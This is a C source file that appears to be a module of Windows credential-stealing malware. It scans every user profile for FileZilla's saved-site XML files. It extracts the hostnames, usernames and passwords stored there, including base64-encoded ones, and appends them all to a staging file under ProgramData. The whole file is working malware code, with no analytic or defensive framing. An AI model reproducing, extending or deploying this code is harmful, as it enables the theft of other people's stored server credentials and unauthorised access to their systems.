#include "main.h"

int get_filezilla_creds(char* xmlfile_path) {
	HANDLE handle, file_to_write;
	DWORD fileSize = 0, read = 0, bytes_written;
	char* creds_buf, *term_string;
	char* out, *pout;

	handle = CreateFileA(xmlfile_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (handle == INVALID_HANDLE_VALUE) {
		return 0;
	}

	fileSize = GetFileSize(handle, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		return 0;
	}

	creds_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
	if (!creds_buf) {
		CloseHandle(handle);
		return 0;
	}

	if (!ReadFile(handle, creds_buf, fileSize, &read, NULL)) {
		CloseHandle(handle);
		return 0;
	}

	CloseHandle(handle);
	term_string = creds_buf;
	out = (char*)my_heapalloc(1024 * 64); //64KB
	if (!out) {
		my_heapfree(creds_buf);
		return 0;
	}

	pout = out;
	while (TRUE) {
		char* username = NULL, * password = NULL, * hostname = NULL;

		hostname = term_string;
		hostname = my_strstr(hostname, "<Host>");
		if (!hostname) {
			break;
		}

		string_remove_substring(hostname, (char*)"<Host>");
		term_string = string_terminate_string(hostname, '<');

		username = term_string + 1;
		username = my_strstr(username, "<User>");
		string_remove_substring(username, (char*)"<User>");
		term_string = string_terminate_string(username, '<');

		password = term_string + 1;
		if (password = my_strstr(password, "<Pass>")) {
			string_remove_substring(password, (char*)"<Pass>");
		}
		else {
			password = term_string + 1;
			password = my_strstr(password, "<Pass encoding=\"base64\">");
			string_remove_substring(password, (char*)"<Pass encoding=\"base64\">");
		}
		
		term_string = string_terminate_string(password, '<');
		my_sprintf(pout, "url: %s\r\nuser: %s\r\npass: %s\r\n\r\n", hostname, username, password);
		pout += my_strlen(pout);

		term_string++;
	}

	char path[260];
	my_sprintf(path, "%s\\%s", programdata_path, "filezilla.txt");
	file_to_write = CreateFileA(path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file_to_write) {
		char user[130];

		my_sprintf(user, "==%s==\r\n\r\n", xmlfile_path);
		WriteFile(file_to_write, user, my_strlen(user), &bytes_written, NULL);
		WriteFile(file_to_write, out, pout - out, &bytes_written, NULL);
		CloseHandle(file_to_write);
	}

	my_heapfree(out);
	my_heapfree(creds_buf);
	return 1;
}

int filezilla_passwords() {
	char userprofile_dir[60];
	char* files[] = { "sitemanager.xml", "recentservers.xml", "filezilla.xml" };
	int profile_size = 60;
	HANDLE find = NULL;
	WIN32_FIND_DATA ffd;

	if (!GetProfilesDirectoryA(userprofile_dir, (DWORD*)&profile_size)) {
		return 0;
	}

	my_strcat(userprofile_dir, "\\*");
	find = FindFirstFileA(userprofile_dir, &ffd);
	if (find == INVALID_HANDLE_VALUE) {
		return 0;
	}

	do {
		if (my_strcmp(ffd.cFileName, ".") == 0 || my_strcmp(ffd.cFileName, "..") == 0) {
			continue;
		}

		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			char filezilla_path[260];
			int filename_len;

			if (my_strcmp(ffd.cFileName, "Default") == 0) continue;

			filename_len = my_strlen(userprofile_dir);
			my_memcpy(filezilla_path, userprofile_dir, filename_len + 1);
			my_memcpy(filezilla_path + filename_len - 1, ffd.cFileName, strlen(ffd.cFileName) + 1);
			my_strcat(filezilla_path, "\\AppData\\Roaming\\FileZilla");
			if (!PathIsDirectoryA(filezilla_path)) {
				continue;
			}

			for (int i = 0; i < 3; i++) {
				char logins_path[260];

				my_sprintf(logins_path, "%s\\%s", filezilla_path, files[i]);
				if (PathFileExistsA(logins_path)) {
					if (!get_filezilla_creds(logins_path)) {
						continue;
					}
				}
			}
		}
	} while (FindNextFile(find, &ffd));

	FindClose(find);
	return 1;
}
